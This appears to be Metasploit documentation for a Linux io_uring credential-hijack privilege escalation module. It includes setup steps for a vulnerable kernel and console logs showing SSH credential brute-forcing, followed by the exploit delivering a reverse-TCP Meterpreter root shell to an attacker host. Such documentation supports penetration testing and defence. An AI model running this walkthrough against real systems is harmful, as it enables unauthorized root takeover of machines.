## Vulnerable Application

This module exploits a bug in io_uring leading to an additional `put_cred()`
that can be exploited to hijack credentials of other processes.

We spawn SUID programs to get the free'd cred object reallocated by a
privileged process and abuse them to create a SUID root binary ourselves
that'll pop a shell.

The dangling cred pointer will, however, lead to a kernel panic as soon as
the task terminates and its credentials are destroyed. We therefore detach
from the controlling terminal, block all signals and rest in silence until
the system shuts down and we get killed hard, just to cry in vain, seeing
the kernel collapse.

The bug affected kernels from v5.12-rc3 to v5.14-rc7.

More than 1 CPU is required for exploitation.

Successfully tested against Ubuntu 22.04.01 with kernel 5.13.12-051312-generic

### Install

To install a vulnerable kernel on Ubuntu 22.04.01, follow these instructions:

1. Download the `linux-*` modules for a vulnerable kernel, such as https://kernel.ubuntu.com/~kernel-ppa/mainline/v5.13.12/amd64/
2. Install `libssl.1` (https://askubuntu.com/a/1403683)
   1. `echo "deb http://security.ubuntu.com/ubuntu focal-security main" | sudo tee /etc/apt/sources.list.d/focal-security.list`
   2. `sudo apt-get update`
   3. `sudo apt-get install libssl1.1`
   4. `sudo rm /etc/apt/sources.list.d/focal-security.list`
3. `sudo apt-get install build-essential`
4. `sudo dpkg -i *.deb`
5. Follow [these instructions](https://gist.github.com/chaiyujin/c08e59752c3e238ff3b1a5098322b363) to boot the vuln kernel
6. `sudo reboot`

## Verification Steps

1. Start msfconsole
2. Get an initial user shell
3. Do: `use linux/local/cve_2022_1043_io_uring_priv_esc`
4. Do: `set session #`
5. Do: `run`
6. You should get a root shell.

## Options

## Scenarios

### Ubuntu 22.04.01 with kernel 5.13.12-051312-generic

Gain initial user access

```
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 1.1.1.1
rhosts => 1.1.1.1
msf6 auxiliary(scanner/ssh/ssh_login) > set username ubuntu
username => ubuntu
msf6 auxiliary(scanner/ssh/ssh_login) > set password ubuntu
password => ubuntu
msf6 auxiliary(scanner/ssh/ssh_login) > run
[*] 1.1.1.1:22 - Starting bruteforce
[+] 1.1.1.1:22 - Success: 'ubuntu:ubuntu' 'uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd) Linux ubuntu2204 5.13.12-051312-generic #202108180838 SMP Wed Aug 18 08:41:42 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux '
[*] SSH session 1 opened (2.2.2.2:40003 -> 1.1.1.1:22) at 2022-11-25 08:47:08 -0500
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 1
[*] Starting interaction with 1...
id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
^Z
Background session 1? [y/N]  y
```

priv esc

```
msf6 auxiliary(scanner/ssh/ssh_login) > use linux/local/cve_2022_1043_io_uring_priv_esc
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf6 exploit(linux/local/cve_2022_1043_io_uring_priv_esc) > set session 1
session => 1
msf6 exploit(linux/local/cve_2022_1043_io_uring_priv_esc) > set verbose true
verbose => true
msf6 exploit(linux/local/cve_2022_1043_io_uring_priv_esc) > exploit
[!] SESSION may not be compatible with this module:
[!]  * incompatible session architecture: 
[*] Started reverse TCP handler on 2.2.2.2:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Kernel version 5.13.12-051312-generic appears to be vulnerable
[+] The target is vulnerable. > 1 CPU required, detected: 2
[+] gcc is installed
[*] Live compiling exploit on system...
[*] Max line length is 65537
[*] Writing 8074 bytes in 1 chunks of 29166 bytes (octal-encoded), using printf
[*] Writing '/tmp/.5wGdoS' (282 bytes) ...
[*] Max line length is 65537
[*] Writing 282 bytes in 1 chunks of 843 bytes (octal-encoded), using printf
[*] Launching exploit...
[*] Transmitting intermediate stager...(126 bytes)
[*] Sending stage (3045348 bytes) to 1.1.1.1
[*] [~] forking helper process...
[+] Deleted /tmp/.iMpuegK0
[+] Deleted /tmp/.5wGdoS
[*] Meterpreter session 2 opened (2.2.2.2:4444 -> 1.1.1.1:35026) at 2022-11-25 17:18:36 -0500

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 1.1.1.1
OS           : Ubuntu 22.04 (Linux 5.13.12-051312-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
```
